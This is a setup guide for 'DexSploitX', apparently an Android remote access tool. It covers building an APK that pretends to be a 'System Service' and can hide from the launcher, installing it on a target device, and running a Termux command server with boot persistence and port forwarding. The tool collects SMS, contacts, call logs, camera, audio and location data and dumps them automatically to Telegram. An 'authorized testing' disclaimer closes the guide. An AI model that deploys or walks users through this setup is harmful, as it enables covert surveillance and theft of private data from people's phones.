# DexSploitX Termux Setup Guide

## ⚠️ IMPORTANT: Recommended Workflow

Due to Android architecture limitations with apktool on Termux (aarch64), we recommend a **hybrid workflow**:

1. **Build APKs on PC** (Windows/Linux/Mac with proper Android SDK)
2. **Run Server on Termux** (Android device for portability)

This approach provides the best stability and compatibility.

---

## Quick Start (Recommended Hybrid Workflow)

### On Your PC (Windows/Linux/Mac)

1. **Clone Repository**
```bash
git clone https://github.com/offsecnight/DexSploitX.git
cd DexSploitX/Builder
```

2. **Install Requirements**
```bash
# Windows
pip install pillow

# Linux
sudo apt install openjdk-17-jdk python3-pip
pip install pillow
```

3. **Download Apktool**
```bash
# Windows/Linux
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar -O apktool.jar
```

4. **Build APK**
```bash
python build.py
```

When prompted for **Server IP**, use your Termux device's IP address (find it on Termux: `ifconfig wlan0`)

5. **Transfer APK to Target Device**
- APK will be in `DexSploitX/APK/` folder
- Install on target Android device

### On Termux (Android)

1. **Install Termux** from [F-Droid](https://f-droid.org/packages/com.termux/)

2. **Setup Environment**
```bash
# Update packages
pkg update && pkg upgrade -y

# Install Python
pkg install -y python git

# Clone repository
cd ~
git clone https://github.com/offsecnight/DexSploitX.git
cd DexSploitX

# Install dependencies
pip install -r requirements.txt
```

3. **Find Your IP Address**
```bash
ifconfig wlan0 | grep inet
# Example output: inet 192.168.1.100
```

4. **Start Server**
```bash
python DexSploitX.py -i 0.0.0.0 -p 8080
```

5. **Keep Server Running in Background**
```bash
# Install tmux
pkg install tmux

# Start session
tmux new -s dexsploit

# Run server
python DexSploitX.py -i 0.0.0.0 -p 8080

# Detach: Ctrl+B then D
# Reattach: tmux attach -t dexsploit
```

---

## Alternative: Build on Termux (Experimental)

⚠️ **WARNING**: Building APKs directly on Termux has known compatibility issues with apktool and aapt2 on aarch64 architecture. This may result in build failures.

### Known Issues

- **aapt2 Syntax Error**: Termux's aapt2 binary is incompatible with apktool
- **Error Message**: `Syntax error: "(" unexpected`
- **Affected Versions**: All apktool versions on Termux aarch64
- **Status**: No reliable workaround available

### If You Still Want to Try

```bash
# Install dependencies
pkg install -y python openjdk-17 wget aapt

# Clone repository
cd ~
git clone https://github.com/offsecnight/DexSploitX.git
cd DexSploitX/Builder

# Download Termux-compatible apktool
wget https://github.com/iBotPeaches/Apktool/releases/download/v2.6.1/apktool_2.6.1.jar -O apktool.jar

# Install Pillow
pip install pillow

# Try building (may fail)
python build.py
```

**If build fails**, use the recommended hybrid workflow above.

---

## Configuration Guide

### Server Configuration

When building APK, you'll configure:

1. **Server IP**: Your Termux device's IP
   ```bash
   # Find on Termux
   ifconfig wlan0 | grep inet
   ```

2. **Server Port**: Default `8080` (any available port)

3. **App Name**: Display name (e.g., "System Service")

4. **Package Name**: Unique identifier (e.g., "com.system.service")

5. **Website URL**: URL displayed in WebView (e.g., "https://www.android.com")

6. **Icon**: Custom app icon (optional)

7. **Telegram Auto-Dump**: Automatic data upload to Telegram
   - Requires Bot Token and Chat ID
   - Data sent from both APK and Server

8. **Hide App**: Hide from launcher (stealth mode)

9. **Permissions**: Select required permissions
   - Contacts, Phone State, Call Logs
   - SMS, Camera, Audio, Location
   - Storage, etc.

### Telegram Integration

Edit `config.json` in DexSploitX root:

```json
{
    "telegram_bot_token": "YOUR_BOT_TOKEN",
    "telegram_chat_id": "YOUR_CHAT_ID"
}
```

Get Bot Token:
1. Message [@BotFather](https://t.me/botfather) on Telegram
2. Create new bot: `/newbot`
3. Copy token

Get Chat ID:
1. Message [@userinfobot](https://t.me/userinfobot)
2. Copy your Chat ID

---

## Running the Server

### Basic Usage

```bash
python DexSploitX.py -i 0.0.0.0 -p 8080
```

### Background Execution

**Using tmux (Recommended)**:
```bash
pkg install tmux
tmux new -s dexsploit
python DexSploitX.py -i 0.0.0.0 -p 8080
# Detach: Ctrl+B then D
# Reattach: tmux attach -t dexsploit
```

**Using screen**:
```bash
pkg install screen
screen -S dexsploit
python DexSploitX.py -i 0.0.0.0 -p 8080
# Detach: Ctrl+A then D
# Reattach: screen -r dexsploit
```

### Auto-Start on Boot

```bash
# Install termux-boot
pkg install termux-boot

# Create boot script
mkdir -p ~/.termux/boot
nano ~/.termux/boot/dexsploit.sh
```

Add:
```bash
#!/data/data/com.termux/files/usr/bin/bash
cd ~/DexSploitX
python DexSploitX.py -i 0.0.0.0 -p 8080 &
```

Make executable:
```bash
chmod +x ~/.termux/boot/dexsploit.sh
```

---

## Network Configuration

### Find Your IP Address

```bash
# WiFi
ifconfig wlan0 | grep inet

# Mobile Data
ifconfig rmnet_data0 | grep inet

# Alternative
ip addr show wlan0
```

### Port Forwarding (Remote Access)

For access outside your local network:

1. **Router Configuration**
   - Login to router admin panel
   - Forward external port to Termux device IP:8080
   - Save settings

2. **Dynamic DNS** (for changing IPs)
   - Use services like No-IP, DuckDNS
   - Configure on router or Termux

3. **Security**
   - Use strong passwords
   - Consider VPN instead of port forwarding
   - Monitor access logs

### Firewall Configuration

```bash
# Check if port is accessible
nc -l -p 8080

# From another device, test connection
nc <termux_ip> 8080
```

---

## Troubleshooting

### Build Issues on Termux

**Problem**: `Syntax error: "(" unexpected` during APK build

**Solution**: Use hybrid workflow (build on PC, run server on Termux)

**Why**: Termux's aapt2 binary is incompatible with apktool on aarch64

---

### Java Not Found

```bash
pkg install openjdk-17
java -version
```

---

### Pillow Installation Failed

```bash
# Try system package
pkg install python-pillow

# Or upgrade pip
pip install --upgrade pip
pip install pillow
```

---

### Port Already in Use

```bash
# Find process using port
lsof -i :8080

# Kill process
kill -9 <PID>

# Or use different port
python DexSploitX.py -i 0.0.0.0 -p 9090
```

---

### Connection Issues

1. **Check Network**
   ```bash
   ping <target_device_ip>
   ```

2. **Verify IP Address**
   ```bash
   ifconfig wlan0
   ```

3. **Test Port**
   ```bash
   nc -l -p 8080
   ```

4. **Firewall**
   - Ensure no firewall blocking port
   - Check router settings

---

### APK Installation Failed

1. **Enable Unknown Sources**
   - Settings → Security → Unknown Sources

2. **Check Android Version**
   - Supports Android 5.0 - 16 (API 21-36)

3. **Signature Conflict**
   - Uninstall old version first
   - Clear app data

---

## Performance Optimization

### Battery Management

```bash
# Disable battery optimization for Termux
# Settings → Apps → Termux → Battery → Unrestricted
```

Keep device plugged in for long sessions.

### Storage Management

```bash
# Check storage
df -h

# Clean old device data
rm -rf devices/OLD_DEVICE_ID

# Monitor size
du -sh devices/
```

### Network Stability

- Use WiFi instead of mobile data
- Keep device close to router
- Avoid network congestion
- Use 5GHz WiFi if available

---

## Advanced Usage

### Multiple Devices

Server supports multiple connected devices simultaneously. Each device gets its own folder in `devices/`.

### Custom Commands

Extend functionality by modifying `DexSploitX.py` command handlers.

### Data Export

```bash
# Backup device data
tar -czf backup.tar.gz devices/

# Transfer to PC
# Use Termux:API or upload to cloud
```

---

## Security Best Practices

1. **Network Security**
   - Use on trusted networks only
   - Consider VPN for remote access
   - Change default ports
   - Use strong keystore passwords

2. **Data Protection**
   - Encrypt stored data
   - Regularly backup and clean sensitive data
   - Use secure file permissions

3. **Legal Compliance**
   - Only use on devices you own or have authorization
   - Comply with local laws and regulations
   - Obtain proper consent before testing
   - Document authorization

4. **Operational Security**
   - Don't expose server to public internet
   - Use authentication if possible
   - Monitor access logs
   - Limit permission scope

---

## Updating

```bash
cd ~/DexSploitX
git pull
pip install -r requirements.txt --upgrade
```

---

## Uninstallation

```bash
# Remove repository
rm -rf ~/DexSploitX

# Remove dependencies (optional)
pip uninstall pillow
pkg uninstall openjdk-17 python
```

---

## Support

- **GitHub Issues**: https://github.com/offsecnight/DexSploitX/issues
- **Documentation**: https://github.com/offsecnight/DexSploitX
- **Developer**: NIGHTKING

---

## Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for legitimate security research and testing purposes. Unauthorized access to devices is ILLEGAL and punishable by law.

By using this tool, you agree to:
- Only test devices you own or have explicit written authorization to test
- Comply with all applicable local, state, and federal laws
- Take full responsibility for your actions
- Not hold the developer liable for any misuse

The developer assumes NO responsibility for misuse, damage, or illegal activities conducted with this tool.

**USE AT YOUR OWN RISK**
